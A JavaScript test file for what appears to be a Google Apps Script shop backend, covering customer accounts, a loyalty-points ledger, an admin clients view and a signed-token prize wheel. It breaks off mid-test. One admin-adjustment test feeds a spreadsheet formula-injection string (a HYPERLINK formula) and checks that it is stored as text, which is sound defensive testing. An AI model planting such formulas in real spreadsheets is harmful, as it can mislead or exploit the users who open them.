test('accounts: reset requests are rate-limited and respect the MailApp quota', () => {
  const env = env0();
  signup(env, { email: 'lina@example.ma' });
  for (let i = 0; i < 5; i++) assert.equal(env.post({ action: 'reset_request', email: 'lina@example.ma' }).ok, true);
  assert.equal(env.mails.length, 3);                                        // 3 per e-mail per hour
  assert.equal(env.post({ action: 'reset_request', email: 'nope' }).field, 'email');
  const env2 = env0({ mailQuota: 0 });
  signup(env2, { email: 'lina@example.ma' });
  assert.equal(env2.post({ action: 'reset_request', email: 'lina@example.ma' }).error, 'mail_unavailable');
});

test('accounts: registrations are capped per hour; account actions never reach the admin API', () => {
  const env = env0();
  for (let i = 0; i < 30; i++) assert.equal(signup(env).ok, true);
  assert.equal(signup(env).error, 'busy');
  const r = env.post({ action: 'login', email: `salma${acctSeq - 1}@example.ma`, password: PW });
  assert.equal(r.ok, true);
  assert.equal(env.post({ action: 'list', key: r.session }).error, 'bad_key');   // a customer token is not an admin token
  assert.equal(env.post({ action: 'me', key: KEY }).error, 'auth');
});

test('setup() also creates the Clients tab and the account column', () => {
  const env = makeEnv();
  env.run('setup');
  assert.equal(env.sheets.Clients.rows[0][0], 'ID client');
  assert.equal(env.sheets.Commandes.rows[0][14], 'Compte client');
  env.run('benchmarkHash');
  assert.ok(env.logs.some((l) => /itérations PBKDF2/.test(l)));
});

// ---------- loyalty points ----------
// RB11 alone = 1690 DH paid (free delivery); BODY alone = 4190 DH (free delivery)
const ptsOf = (env) => (env.sheets.Points ? env.sheets.Points.rows.slice(1) : []);
const bal = (env, s) => env.post({ action: 'me', session: s }).points.balance;
const setStatus = (env, id, status) => env.post({ action: 'update', key: KEY, id: id, status: status });
const adjust = (env, client, delta, reason = 'Geste commercial') => env.post({ action: 'points_adjust', key: KEY, client: client, delta: delta, reason: reason });
// every write to the Points tab must happen while the script lock is held
const strict = (env) => { env.guard = (name) => { if (name === 'Points' && !env.lock.held) throw new Error('Points written without the lock'); }; return env; };

test('points: 50 DH per full 1 500 DH delivered, the remainder carries over; guests and open orders earn nothing', () => {
  const env = strict(env0());
  const a = signup(env);
  const me0 = env.post({ action: 'me', session: a.session });
  assert.deepEqual(me0.points, { balance: 0, spend: 0, earned: 0, step: 1500, reward: 50, progress: 0, next: 1500 });
  const o1 = env.post(order({ session: a.session }));
  const o2 = env.post(order({ session: a.session }));
  const o3 = env.post(order({ session: a.session, items: [{ id: BODY, qty: 1 }] }));
  const guest = env.post(order());
  setStatus(env, guest.orderId, 'Livrée');
  setStatus(env, o1.orderId, 'Confirmée');
  setStatus(env, o1.orderId, 'Expédiée');
  assert.equal(ptsOf(env).length, 0);                                       // nothing before delivery, nothing for guests
  const u1 = setStatus(env, o1.orderId, 'Livrée');
  assert.equal(u1.order.pointsEarned, 50);
  assert.equal(u1.clients[a.profile.id].balance, 50);
  let me = env.post({ action: 'me', session: a.session }).points;
  assert.equal(me.spend, 1690);
  assert.equal(me.progress, 190);
  assert.equal(me.next, 1310);                                              // « Plus que 1 310 DH »
  setStatus(env, o2.orderId, 'Livrée');                                     // 3 380 DH → 2 thresholds
  assert.equal(bal(env, a.session), 100);
  setStatus(env, o3.orderId, 'Livrée');                                     // 7 939 DH → 5 thresholds
  me = env.post({ action: 'me', session: a.session }).points;
  assert.equal(me.balance, 250);
  assert.equal(me.earned, 250);
  assert.equal(me.next, 1500 - (7570 % 1500));
  const L = ptsOf(env);
  assert.deepEqual(L.map((v) => [v[3], v[4], v[5], v[6], v[7]]), [
    [o1.orderId, 'gain', 50, 1690, 50], [o2.orderId, 'gain', 50, 1690, 100], [o3.orderId, 'gain', 150, 4190, 250]]);
  assert.equal(L[0][1], a.profile.id);
  assert.equal(L[0][2], a.profile.email);
  assert.deepEqual(rowsOf(env, 'Points')[0], ['Date', 'ID client', 'E-mail', 'N° commande', 'Type', 'Points (DH)', 'Achats comptés (DH)', 'Solde après', 'Motif']);
  const h = env.post({ action: 'my_points', session: a.session });
  assert.equal(h.ok, true);
  assert.equal(h.points.balance, 250);
  assert.deepEqual(h.history.map((x) => [x.order, x.type, x.pts]), [[o3.orderId, 'gain', 150], [o2.orderId, 'gain', 50], [o1.orderId, 'gain', 50]]);
  assert.equal(h.history[0].label, 'Commande livrée');
  assert.equal(env.post({ action: 'my_points', session: 'k1.' + 'B'.repeat(43) }).error, 'auth');
  const mine = env.post({ action: 'my_orders', session: a.session }).orders.find((o) => o.id === o3.orderId);
  assert.equal(mine.pointsEarned, 150);
  assert.ok(env.lock.taken > 0 && !env.lock.held);
});

test('points: setting « Livrée » twice (or re-saving it) credits once', () => {
  const env = strict(env0());
  const a = signup(env);
  const o = env.post(order({ session: a.session }));
  setStatus(env, o.orderId, 'Livrée');
  setStatus(env, o.orderId, 'Livrée');
  env.post({ action: 'update', key: KEY, id: o.orderId, status: 'Livrée', note: 'livré en main propre' });
  env.post({ action: 'update', key: KEY, id: o.orderId, note: 'note seule' });
  assert.equal(ptsOf(env).length, 1);
  assert.equal(bal(env, a.session), 50);
});

test('points: « Retournée » takes the purchase and its points back; re-delivering credits them again', () => {
  const env = strict(env0());
  const a = signup(env);
  const o1 = env.post(order({ session: a.session }));
  const o2 = env.post(order({ session: a.session }));
  setStatus(env, o1.orderId, 'Livrée');
  setStatus(env, o2.orderId, 'Livrée');
  assert.equal(bal(env, a.session), 100);
  const r = setStatus(env, o2.orderId, 'Retournée');
  assert.equal(r.ok, true);
  assert.equal(r.order.pointsEarned, 0);
  assert.match(r.order.hist.slice(-1)[0].note, /Fidélité : -1690 DH d’achats comptés, -50 points/);
  let me = env.post({ action: 'me', session: a.session }).points;
  assert.equal(me.balance, 50);
  assert.equal(me.spend, 1690);                                             // the 190 DH carry-over is intact
  setStatus(env, o2.orderId, 'Retournée');
  assert.equal(ptsOf(env).length, 3);                                       // idempotent
  // a delivered order moved back by mistake is reversed too, then credited again
  setStatus(env, o1.orderId, 'Expédiée');
  assert.equal(bal(env, a.session), 0);
  setStatus(env, o1.orderId, 'Livrée');
  setStatus(env, o2.orderId, 'Livrée');
  me = env.post({ action: 'me', session: a.session }).points;
  assert.equal(me.balance, 100);
  assert.equal(me.spend, 3380);
  assert.deepEqual(ptsOf(env).map((v) => v[4]), ['gain', 'gain', 'retrait', 'retrait', 'gain', 'gain']);
});

test('points: redeeming at checkout — deducted server-side, capped at the order total, stored in the sheet', () => {
  const env = strict(env0({ props: { ADMIN_KEY: KEY, NOTIFY_EMAIL: 'shop@example.org' } }));
  const a = signup(env);
  assert.equal(adjust(env, a.profile.id, 3000).ok, true);
  const r = env.post(order({ session: a.session, points: 120, total: 1570 }));
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.points, 120);
  assert.equal(r.total, 1570);
  assert.equal(r.balance, 2880);
  assert.equal(r.adjusted, false);
  const c = rowsOf(env, 'Commandes');
  assert.equal(c[0][15], 'Points utilisés (DH)');
  const v = c.find((x) => x[1] === r.orderId);
  assert.equal(v[13], 1570);                                                // Total = amount to collect
  assert.equal(v[15], 120);
  const g = rowsOf(env, 'Gestion').find((x) => x[0] === r.orderId);
  assert.match(g[2], /Points fidélité utilisés : 120 DH/);
  assert.match(env.mails[0].body, /Points fidélité utilisés : -120 DH/);
  const last = ptsOf(env).slice(-1)[0];
  assert.deepEqual([last[3], last[4], last[5], last[7]], [r.orderId, 'utilisation', -120, 2880]);
  // cap: never more than the order total (after promo)
  const over = env.post(order({ session: a.session, points: 1716 }));
  assert.equal(over.ok, false);
  assert.equal(over.error, 'bad_points');
  assert.equal(over.max, 1690);
  assert.equal(over.balance, 2880);
  const promo = env.post(order({ session: a.session, promoCode: 'KOBG26', points: 1691 }));
  assert.equal(promo.error, 'bad_points');                                  // the old code gives nothing: max 1690
  assert.equal(promo.max, 1690);
  const all = env.post(order({ session: a.session, points: 1690 }));
  assert.equal(all.ok, true);
  assert.equal(all.total, 0);
  assert.equal(all.balance, 1190);
  // a free order does not count as a purchase
  setStatus(env, all.orderId, 'Livrée');
  assert.equal(bal(env, a.session), 1190);
  // admin list shows points used and the customer's balance
  const list = env.post({ action: 'list', key: KEY });
  assert.equal(list.orders.find((o) => o.id === r.orderId).points, 120);
  assert.equal(list.orders.find((o) => o.id === r.orderId).client, a.profile.id);
  assert.equal(list.clients[a.profile.id].balance, 1190);
  // retrying the same submission does not debit twice
  const again = env.post(order({ orderId: r.orderId, telephone: v[3], session: a.session, points: 120 }));
  assert.equal(again.duplicate, true);
  assert.equal(again.points, 120);
  assert.equal(bal(env, a.session), 1190);
});

test('points: tampered amounts are refused and nothing is written', () => {
  const env = strict(env0());
  const a = signup(env);
  adjust(env, a.profile.id, 100);
  env.post(order());
  const before = rowsOf(env, 'Commandes').length;
  const n = ptsOf(env).length;
  for (const p of [101, -50, 10.5, '50', '1e3', [50], { v: 1 }, true, 1e9]) {
    const r = env.post(order({ session: a.session, points: p }));
    assert.equal(r.ok, false, String(p));
    assert.equal(r.error, 'bad_points', String(p));
  }
  assert.equal(env.post(order({ points: 50 })).error, 'auth');                                     // guest
  assert.equal(env.post(order({ session: 'k1.' + 'B'.repeat(43), points: 50 })).error, 'auth');    // stale session
  assert.equal(rowsOf(env, 'Commandes').length, before);
  assert.equal(ptsOf(env).length, n);
  assert.equal(bal(env, a.session), 100);
  // the client's own total is never trusted: the server recomputes and flags the mismatch
  const r = env.post(order({ session: a.session, points: 100, total: 10 }));
  assert.equal(r.total, 1590);
  assert.equal(r.adjusted, true);
  // a second order cannot spend the same balance
  assert.equal(env.post(order({ session: a.session, points: 1 })).error, 'bad_points');
  // customers cannot call the admin points actions
  assert.equal(env.post({ action: 'points_adjust', key: a.session, client: a.profile.id, delta: 500, reason: 'moi' }).error, 'bad_key');
  assert.equal(env.post({ action: 'points_adjust', client: a.profile.id, delta: 500, reason: 'moi' }).error, 'bad_key');
  assert.equal(bal(env, a.session), 0);
});

test('points: « Annulée » gives the points used back once; re-activating the order debits them again', () => {
  const env = strict(env0());
  const a = signup(env);
  adjust(env, a.profile.id, 200);
  const o = env.post(order({ session: a.session, points: 150 }));
  assert.equal(o.balance, 50);
  const c = setStatus(env, o.orderId, 'Annulée');
  assert.match(c.order.hist.slice(-1)[0].note, /\+150 points rendus/);
  assert.equal(bal(env, a.session), 200);
  setStatus(env, o.orderId, 'Annulée');
  assert.equal(bal(env, a.session), 200);
  setStatus(env, o.orderId, 'Confirmée');                                    // mistake undone
  assert.equal(bal(env, a.session), 50);
  // delivered then returned: the points used come back and the purchase is taken out
  setStatus(env, o.orderId, 'Livrée');                                       // 1 625 DH paid → +50
  assert.equal(bal(env, a.session), 100);
  setStatus(env, o.orderId, 'Retournée');
  assert.equal(bal(env, a.session), 200);
  const types = ptsOf(env).map((v) => v[4]);
  assert.deepEqual(types, ['ajustement', 'utilisation', 'remboursement', 'utilisation', 'gain', 'retrait', 'remboursement']);
  const h = env.post({ action: 'my_points', session: a.session }).history;
  assert.equal(h.slice(-1)[0].label, 'Ajustement par notre équipe');
  assert.ok(!JSON.stringify(h).includes('Geste commercial'));                // the team's reason stays internal
});

test('points: admin adjustment needs the key, a whole amount and a reason; reasons are stored as text', () => {
  const env = strict(env0());
  const a = signup(env);
  assert.equal(adjust(env, a.profile.id, 0).error, 'bad_points');
  assert.equal(adjust(env, a.profile.id, 2.5).error, 'bad_points');
  assert.equal(adjust(env, a.profile.id, '100').error, 'bad_points');
  assert.equal(adjust(env, a.profile.id, 100001).error, 'bad_points');
  assert.equal(adjust(env, a.profile.id, 10, ' a ').error, 'bad_reason');
  assert.equal(adjust(env, 'c_inconnu', 10).error, 'not_found');
  assert.equal(ptsOf(env).length, 0);
  const r = adjust(env, a.profile.id, 75, '=HYPERLINK("http://x","clic")');
  assert.equal(r.ok, true);
  assert.equal(r.client.balance, 75);
  assert.equal(r.client.history[0].motif, 'Ajustement admin : =HYPERLINK("http://x","clic")');
  assert.equal(formulas(env).length, 0);
  assert.equal(adjust(env, a.profile.id, -100, 'Correction erreur').client.balance, -25);
  const p = env.post({ action: 'points', key: KEY, client: a.profile.id });
  assert.equal(p.ok, true);
  assert.equal(p.client.balance, -25);
  assert.equal(p.client.email, a.profile.email);
  assert.equal(env.post({ action: 'points', key: KEY, client: 'nope' }).error, 'not_found');
  // balance below zero (points spent, then the order returned): nothing can be redeemed
  assert.equal(env.post(order({ session: a.session, points: 1 })).error, 'bad_points');
  assert.equal(env.post(order({ session: a.session })).ok, true);
});

test('points: LockService — a busy lock writes nothing, and every ledger write holds the lock', () => {
  const env = strict(env0());
  const a = signup(env);
  adjust(env, a.profile.id, 300);
  const o = env.post(order({ session: a.session, points: 100 }));
  const n = ptsOf(env).length, rows = rowsOf(env, 'Commandes').length;
  env.lock.busy = true;                                                     // another execution holds it
  assert.equal(env.post(order({ session: a.session, points: 100 })).error, 'busy');
  assert.equal(setStatus(env, o.orderId, 'Livrée').error, 'busy');
  assert.equal(adjust(env, a.profile.id, 10).error, 'busy');
  assert.equal(ptsOf(env).length, n);
  assert.equal(rowsOf(env, 'Commandes').length, rows);
  env.lock.busy = false;
  assert.equal(setStatus(env, o.orderId, 'Livrée').ok, true);
  assert.equal(env.lock.held, false);                                       // always released
  assert.equal(bal(env, a.session), 250);
  // the guard really fires when a write happens outside the lock
  assert.throws(() => env.ctx.addPoints_(env.ctx.ledger_(env.ctx.book_()), { client: { id: a.profile.id }, pts: 1 }), /without the lock/);
});

test('setup() creates the Points tab and the points column', () => {
  const env = makeEnv();
  env.run('setup');
  assert.equal(env.sheets.Points.rows[0][5], 'Points (DH)');
  assert.equal(env.sheets.Points.frozen, 1);
  assert.equal(env.sheets.Commandes.rows[0][15], 'Points utilisés (DH)');
});

// ---------- admin « Clients » view ----------
const SAFE_CLIENT_KEYS = ['id', 'email', 'nom', 'tel', 'adresse', 'ville', 'cree', 'creeTs', 'vu', 'gone', 'balance', 'spend', 'earned', 'step', 'reward', 'progress', 'next',
  'moves', 'orders', 'active', 'lastOrder', 'lastOrderTs', 'lastOrderId', 'wheel'].sort();

test('clients: needs the admin key (or a signed admin session); a customer session is not enough', () => {
  const env = env0();
  const a = signup(env);
  const tok = env.post({ action: 'auth', key: KEY }).token;
  assert.equal(env.post({ action: 'clients' }).error, 'bad_key');
  assert.equal(env.post({ action: 'clients', key: 'wrong-key-123' }).error, 'bad_key');
  assert.equal(env.post({ action: 'clients', session: a.session }).error, 'bad_key');
  assert.equal(env.post({ action: 'client', key: a.session, client: a.profile.id }).error, 'bad_key');
  assert.equal(env.post({ action: 'client', client: a.profile.id }).error, 'locked');            // 5th wrong try: the usual lock
  assert.equal(env.post({ action: 'clients', key: KEY }).error, 'locked');
  assert.equal(env.post({ action: 'clients', key: tok }).ok, true);                              // signed admin session still works
  assert.equal(env.post({ action: 'client', key: tok, client: a.profile.id }).ok, true);
  assert.equal(env.post({ action: 'client', key: tok, client: 'C-NOPE' }).error, 'not_found');
  assert.equal(env.post({ action: 'client', key: tok }).error, 'not_found');
});

test('clients: no password hash, salt, iterations, session or reset token ever leaves the script', () => {
  const env = env0();
  const a = signup(env, { email: 'secret@example.ma' });
  const b = signup(env);
  env.post({ action: 'login', email: 'secret@example.ma', password: PW });
  env.post({ action: 'reset_request', email: 'secret@example.ma' });
  const reset = resetLink(env.mails[0]);
  const o = env.post(order({ session: a.session }));
  setStatus(env, o.orderId, 'Livrée');
  const list = env.post({ action: 'clients', key: KEY });
  const one = env.post({ action: 'client', key: KEY, client: a.profile.id });
  const crows = rowsOf(env, 'Clients').slice(1);
  const secrets = crows.flatMap((r) => [r[9], r[10]]).filter(Boolean).map(String)
    .concat([a.session, b.session, reset, PW])
    .concat([...env.props.keys()].filter((k) => /^(ses|rst):/.test(k)).map((k) => k.slice(4)));
  assert.ok(secrets.length >= 8);
  for (const r of [list, one]) {
    const txt = JSON.stringify(r);
    secrets.forEach((s) => assert.ok(!txt.includes(s), 'leaked ' + s.slice(0, 6) + '…'));
    assert.ok(!/"(sel|hash|iter|salt|token|session|row)"\s*:/.test(txt));
  }
  list.clients.forEach((c) => assert.deepEqual(Object.keys(c).sort(), SAFE_CLIENT_KEYS));
  assert.deepEqual(Object.keys(one.profile).sort(), ['adresse', 'cree', 'creeTs', 'email', 'gone', 'id', 'nom', 'tel', 'ville', 'vu']);
});

test('clients: one line per account with the right balance, counted spend, progress, orders and last order', () => {
  const env = strict(env0());
  const a = signup(env, { nom: 'Amine Alaoui', ville: 'Rabat' });
  const b = signup(env, { nom: 'Bouchra Idrissi' });
  const c = signup(env, { nom: 'Chaimae Zerouali' });                       // never ordered
  const a1 = env.post(order({ session: a.session }));
  const a2 = env.post(order({ session: a.session, items: [{ id: BODY, qty: 1 }] }));
  const a3 = env.post(order({ session: a.session }));
  const b1 = env.post(order({ session: b.session }));
  env.post(order());                                                         // guest order: no account line
  setStatus(env, a1.orderId, 'Livrée');
  setStatus(env, a2.orderId, 'Livrée');
  setStatus(env, a3.orderId, 'Annulée');
  setStatus(env, b1.orderId, 'Livrée');
  adjust(env, b.profile.id, -20, 'Correction manuelle');
  const r = env.post({ action: 'clients', key: KEY });
  assert.equal(r.ok, true);
  assert.equal(r.clients.length, 3);
  const by = Object.fromEntries(r.clients.map((x) => [x.id, x]));
  const meA = env.post({ action: 'me', session: a.session }).points, meB = env.post({ action: 'me', session: b.session }).points;
  assert.equal(by[a.profile.id].balance, meA.balance);
  assert.equal(by[a.profile.id].balance, 150);                               // 1 775 + 4 190 = 5 965 DH → 3 × 50
  assert.equal(by[a.profile.id].spend, meA.spend);
  assert.equal(by[a.profile.id].progress, meA.progress);
  assert.equal(by[a.profile.id].next, meA.next);
  assert.equal(by[a.profile.id].orders, 3);
  assert.equal(by[a.profile.id].active, 2);
  assert.equal(by[a.profile.id].lastOrderId, a3.orderId);
  assert.match(by[a.profile.id].lastOrder, /^\d\d\/\d\d\/\d{4} \d\d:\d\d$/);
  assert.equal(by[a.profile.id].ville, 'Rabat');
  assert.equal(by[b.profile.id].balance, 30);
  assert.equal(by[b.profile.id].balance, meB.balance);
  assert.equal(by[b.profile.id].earned, 50);
  assert.equal(by[b.profile.id].moves, 2);
  assert.deepEqual([by[c.profile.id].balance, by[c.profile.id].orders, by[c.profile.id].lastOrder, by[c.profile.id].next], [0, 0, '', 1500]);
  assert.match(by[c.profile.id].cree, /^\d\d\/\d\d\/\d{4}$/);
  assert.deepEqual(r.clients.map((x) => x.id), [a.profile.id, b.profile.id, c.profile.id]);   // highest balance first
  // detail: full points history (newest first) and the account's orders
  const d = env.post({ action: 'client', key: KEY, client: b.profile.id });
  assert.equal(d.client.balance, 30);
  assert.deepEqual(d.client.history.map((h) => [h.type, h.pts, h.solde]), [['ajustement', -20, 30], ['gain', 50, 50]]);
  assert.match(d.client.history[0].motif, /Correction manuelle$/);
  const da = env.post({ action: 'client', key: KEY, client: a.profile.id });
  assert.deepEqual(da.orders.map((o) => o.id).sort(), [a1.orderId, a2.orderId, a3.orderId].sort());
  assert.deepEqual(Object.fromEntries(da.orders.map((o) => [o.id, o.statut])), { [a1.orderId]: 'Livrée', [a2.orderId]: 'Livrée', [a3.orderId]: 'Annulée' });
  assert.equal(da.orders.find((o) => o.id === a2.orderId).pointsEarned, 100);
  assert.equal(da.profile.nom, 'Amine Alaoui');
  // reading the list writes nothing
  const before = JSON.stringify(env.sheets);
  env.post({ action: 'clients', key: KEY });
  env.post({ action: 'client', key: KEY, client: a.profile.id });
  assert.equal(JSON.stringify(env.sheets), before);
});

test('clients: a deleted account that still has points stays listed as « compte supprimé »', () => {
  const env = env0();
  const a = signup(env, { email: 'parti@example.ma' });
  adjust(env, a.profile.id, 70);
  const sh = env.sheets.Clients;
  sh.rows.splice(1, 1);                                                      // account row removed by hand in the sheet
  const r = env.post({ action: 'clients', key: KEY });
  assert.equal(r.clients.length, 1);
  assert.deepEqual([r.clients[0].id, r.clients[0].gone, r.clients[0].balance, r.clients[0].email], [a.profile.id, true, 70, 'parti@example.ma']);
  const d = env.post({ action: 'client', key: KEY, client: a.profile.id });
  assert.equal(d.profile.gone, true);
  assert.equal(d.client.balance, 70);
});

// ---------- prize wheel (« Roue de la chance ») ----------
const vm = require('node:vm');
const SLICE_KEYS = ['pts10', 'gant', 'pts25', 'pts50', 'pct50', 'pts10', 'protecteur', 'pts25', 'pct20', 'pts100'];
const PPM = [241575, 100, 241575, 16650, 100, 241575, 100, 241575, 16650, 100];      // odds × 10 000
let wheelSeq = 0;
// a validly signed token for slice i (what the server would have drawn), made with the env's own secret
function mint(env, i, extra = {}) {
  wheelSeq += 1;
  const sp = Object.assign({ id: ('TestSpin' + String(wheelSeq).padStart(8, '0')).slice(0, 16), i: i, key: SLICE_KEYS[i], t: Date.now() }, extra);
  return env.ctx.wheelToken_(env.ctx.wheelSecret_(true), sp);
}
function wheelUser(env, tel, extra = {}) {
  return signup(env, Object.assign({ telephone: tel }, extra));
}
const meOf = (env, s) => env.post({ action: 'me', session: s });

test('wheel: the odds table is exactly the one published (1 000 000 tickets, none at 0)', () => {
  const env = env0();
  const ppm = env.ctx.wheelOdds_();
  assert.deepEqual(Array.from(ppm), PPM);
  assert.equal(ppm.reduce((a, b) => a + b, 0), 1000000);
  // every ticket maps to exactly one slice, and each slice gets exactly its share
  const count = new Array(10).fill(0);
  for (let r = 0; r < 1000000; r++) count[env.ctx.wheelPick_(r, ppm)]++;
  assert.deepEqual(count, PPM);
  // grouped per prize: 0.01 % each for the 4 jackpots, 1.665 % for 50 points / -20 %, 24.1575 % per small slice
  const per = {};
  SLICE_KEYS.forEach((k, i) => { per[k] = (per[k] || 0) + count[i] / 10000; });
  assert.deepEqual(per, { pts10: 48.315, gant: 0.01, pts25: 48.315, pts50: 1.665, pct50: 0.01, protecteur: 0.01, pct20: 1.665, pts100: 0.01 });
  // a slice at 0 % (or a total ≠ 100 %) disables the wheel instead of giving wrong odds
  vm.runInContext('WHEEL.slices[1].odds = 0; WHEEL.slices[0].odds += 0.01;', env.ctx);
  assert.equal(env.ctx.wheelOdds_(), null);
  assert.equal(env.post({ action: 'wheel_spin' }).error, 'wheel_off');
  vm.runInContext('WHEEL.slices[1].odds = 0.01; WHEEL.slices[0].odds = 24.1575; WHEEL.slices[2].odds = 25;', env.ctx);
  assert.equal(env.ctx.wheelOdds_(), null);
});

test('wheel: the random source is uniform (chi-square) and the real draw follows the odds', () => {
  const env = env0();
  // randBelow_: 10 buckets × 200 000 draws; 9 degrees of freedom, p = 0.001 critical value 27.88
  const N = 200000, b = new Array(10).fill(0);
  for (let i = 0; i < N; i++) b[env.ctx.randBelow_(10)]++;
  const chiU = b.reduce((s, o) => s + (o - N / 10) ** 2 / (N / 10), 0);
  assert.ok(chiU < 27.88, 'uniformity chi² = ' + chiU);
  for (let i = 0; i < 2000; i++) { const x = env.ctx.randBelow_(1000000); assert.ok(Number.isInteger(x) && x >= 0 && x < 1000000); }
  // the full draw (randBelow_ + wheelPick_), 400 000 spins, grouped into the 6 cells with an expected count >= 5:
  // the 4 jackpots together (0.04 % = 160 expected), 50 points, -20 %, and the 4 small slices
  const M = 400000, ppm = env.ctx.wheelOdds_();
  const got = new Array(10).fill(0);
  for (let i = 0; i < M; i++) got[env.ctx.wheelPick_(env.ctx.randBelow_(1000000), ppm)]++;
  const cells = [[1, 4, 6, 9], [3], [8], [0], [2], [5], [7]];
  const chi = cells.reduce((s, c) => {
    const e = c.reduce((n, i) => n + PPM[i], 0) / 1e6 * M, o = c.reduce((n, i) => n + got[i], 0);
    return s + (o - e) ** 2 / e;
  }, 0);
  assert.ok(chi < 22.46, 'distribution chi² = ' + chi + ' ' + got.join(','));          // 6 df, p = 0.001
  assert.ok(got[1] + got[4] + got[6] + got[9] > 80 && got[1] + got[4] + got[6] + got[9] < 260);
  [0, 2, 5, 7].forEach((i) => assert.ok(Math.abs(got[i] / M - 0.241575) < 0.005));
});

test('wheel: spin answers a signed token; sending it back gives the same result; counts spins', () => {
  const env = env0();
  const a = env.post({ action: 'wheel_spin' });
  assert.equal(a.ok, true, JSON.stringify(a));
  assert.match(a.token, /^w1\.[A-Za-z0-9]{16}\.\d+\.[a-z0-9]+\.[0-9a-z]+\.[A-Za-z0-9_-]{43}$/);
  assert.equal(SLICE_KEYS[a.slice], a.prize.key);
  assert.ok(env.props.get('WHEEL_SECRET').length >= 64);                      // created at the first spin
  const again = env.post({ action: 'wheel_spin', token: a.token });
  assert.equal(again.again, true);
  assert.equal(again.slice, a.slice);
  assert.equal(again.token, a.token);
  const st = JSON.parse(env.props.get('WHEEL_STATS'));
  assert.equal(st.n, 1);                                                        // the replay is not a new spin
  assert.equal(st.by[a.prize.key], 1);
  // no odds or secret in the answer
  assert.ok(!JSON.stringify(a).includes(env.props.get('WHEEL_SECRET')));
  assert.equal(a.odds, undefined);
});

test('wheel: a tampered token is refused (slice, prize, time or signature edited)', () => {
  const env = env0();
  const a = signup(env);
  const tok = mint(env, 0);                                                   // 10 points
  const p = tok.split('.');
  const forged = [
    [p[0], p[1], '9', 'pts100', p[4], p[5]].join('.'),                         // pretend it landed on 100 points
    [p[0], p[1], p[2], 'pts100', p[4], p[5]].join('.'),
    [p[0], p[1], p[2], p[3], (Date.now() + 1).toString(36), p[5]].join('.'),
    [p[0], 'X' + p[1].slice(1), p[2], p[3], p[4], p[5]].join('.'),
    tok.slice(0, -1) + (tok.slice(-1) === 'A' ? 'B' : 'A'),
    'w1.' + 'A'.repeat(16) + '.9.pts100.' + Date.now().toString(36) + '.' + 'A'.repeat(43),
    'nope', '', 42, null,
  ];
  forged.forEach((f) => {
    assert.equal(env.post({ action: 'wheel_claim', session: a.session, token: f }).error, 'wheel_bad', String(f));
    const s = env.post({ action: 'wheel_spin', token: f });
    assert.equal(s.ok, true);
    assert.equal(s.again, undefined);                                           // a forged token just gets a fresh draw
  });
  // signed with another secret (another deployment, or the secret rotated)
  const other = env0();
  assert.equal(env.post({ action: 'wheel_claim', session: a.session, token: mint(other, 9) }).error, 'wheel_bad');
  assert.equal(env.sheets.Roue, undefined);                                   // nothing claimed, nothing written
  // the genuine one still works
  assert.equal(env.post({ action: 'wheel_claim', session: a.session, token: tok }).ok, true);
});

test('wheel: claim needs a session; points prize credits the ledger « Roue de la chance »', () => {
  const env = env0();
  const tok = mint(env, 2);                                                   // 25 points
  assert.equal(env.post({ action: 'wheel_claim', token: tok }).error, 'auth');
  assert.equal(env.post({ action: 'wheel_claim', token: tok, session: 'k1.' + 'A'.repeat(43) }).error, 'auth');
  const a = wheelUser(env, '0612000001');
  const c = env.post({ action: 'wheel_claim', session: a.session, token: tok });
  assert.equal(c.ok, true, JSON.stringify(c));
  assert.equal(c.balance, 25);
  assert.equal(c.wheel.kind, 'points');
  assert.equal(c.wheel.state, 'credited');
  const L = rowsOf(env, 'Points');
  assert.equal(L[1][4], 'roue');
  assert.equal(L[1][5], 25);
  assert.match(L[1][8], /^Roue de la chance : 25 points/);
  const me = meOf(env, a.session);
  assert.equal(me.points.balance, 25);
  assert.equal(me.points.earned, 0);                                           // not « earned from purchases »
  assert.equal(me.wheel.label, '25 points');
  assert.equal(me.wheel.spin, undefined);
  const h = env.post({ action: 'my_points', session: a.session }).history[0];
  assert.equal(h.label, 'Roue de la chance');
  assert.equal(h.pts, 25);
  const R = rowsOf(env, 'Roue');
  assert.equal(R[1][11], 'Crédité');
  assert.equal(R[1][7], a.profile.id);
});

test('wheel: one claim per spin, per account, per e-mail and per phone number', () => {
  const env = env0();
  const a = wheelUser(env, '0612000011');
  const tok = mint(env, 0);
  assert.equal(env.post({ action: 'wheel_claim', session: a.session, token: tok }).ok, true);
  // same token again: same account, or another account
  const again = env.post({ action: 'wheel_claim', session: a.session, token: tok });
  assert.equal(again.error, 'wheel_used');
  assert.equal(again.mine, true);
  const b = wheelUser(env, '0612000012');
  assert.equal(env.post({ action: 'wheel_claim', session: b.session, token: tok }).error, 'wheel_used');
  // a new spin (storage cleared) for the same account
  assert.equal(env.post({ action: 'wheel_claim', session: a.session, token: mint(env, 9) }).error, 'wheel_account');
  // another account with the same phone number (formatted differently)
  const c = wheelUser(env, '+212 6 12 00 00 11');
  assert.equal(env.post({ action: 'wheel_claim', session: c.session, token: mint(env, 9) }).error, 'wheel_person');
  // the first account's e-mail is changed by hand in the sheet: still blocked on e-mail for a new account using it
  const R = rowsOf(env, 'Roue');
  assert.equal(R.length, 2);
  const d = wheelUser(env, '0612000013');
  R[1][8] = d.profile.email;                                                 // claim row now carries d's e-mail
  assert.equal(env.post({ action: 'wheel_claim', session: d.session, token: mint(env, 9) }).error, 'wheel_person');
  // b (fresh account, own phone and e-mail) can claim its own new spin
  assert.equal(env.post({ action: 'wheel_claim', session: b.session, token: mint(env, 5) }).ok, true);
  assert.equal(rowsOf(env, 'Roue').length, 3);
  assert.equal(meOf(env, a.session).points.balance, 10);
});

test('wheel: a spin can be claimed for 30 days; every claim write holds the lock', () => {
  const env = env0();
  const a = wheelUser(env, '0612000021');
  const old = mint(env, 0, { t: Date.now() - 31 * 864e5 });
  assert.equal(env.post({ action: 'wheel_claim', session: a.session, token: old }).error, 'wheel_expired');
  env.lock.busy = true;
  assert.equal(env.post({ action: 'wheel_claim', session: a.session, token: mint(env, 0) }).error, 'busy');
  assert.equal(env.post({ action: 'wheel_spin' }).error, 'busy');
  env.lock.busy = false;
  assert.equal(env.sheets.Roue, undefined);                                    // nothing written
  assert.equal(env.post({ action: 'wheel_claim', session: a.session, token: mint(env, 0, { t: Date.now() - 29 * 864e5 }) }).ok, true);
});

test('wheel: global hourly cap on new spins (a replayed token is not a new spin)', () => {
  const env = env0();
  const first = env.post({ action: 'wheel_spin' });
  env.cache.put('wh:h:' + Math.floor(Date.now() / 3600000), '400', 3600);
  assert.equal(env.post({ action: 'wheel_spin' }).error, 'busy');
